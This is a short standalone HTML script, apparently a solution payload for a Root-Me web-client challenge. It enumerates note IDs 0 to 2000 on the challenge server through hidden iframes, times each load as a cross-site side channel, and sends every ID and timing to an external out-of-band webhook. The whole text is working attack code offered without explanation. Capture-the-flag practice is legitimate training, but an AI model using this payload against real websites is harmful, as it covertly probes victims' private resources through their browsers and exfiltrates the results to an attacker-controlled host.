<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";

let i = 0;
const MAX = 2000;

function probe(id) {
    return new Promise(resolve => {
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";

        const start = performance.now();

        let done = false;

        iframe.onload = () => {
            if (done) return;
            done = true;

            const delta = performance.now() - start;

            console.log("ID:", id, "TIME:", delta);

            const ex = document.createElement("iframe");
            ex.src = WEBHOOK + "?id=" + id + "&t=" + delta;
            ex.style.display = "none";
            document.body.appendChild(ex);

            if (iframe.parentNode) {
                iframe.parentNode.removeChild(iframe);
            }

            resolve();
        };

        iframe.src = TARGET + id;
        document.body.appendChild(iframe);
    });
}

async function loop() {
    for (let id = 0; id <= MAX; id++) {
        await probe(id);

        await new Promise(r => setTimeout(r, 200));
    }
}

loop();
</script>
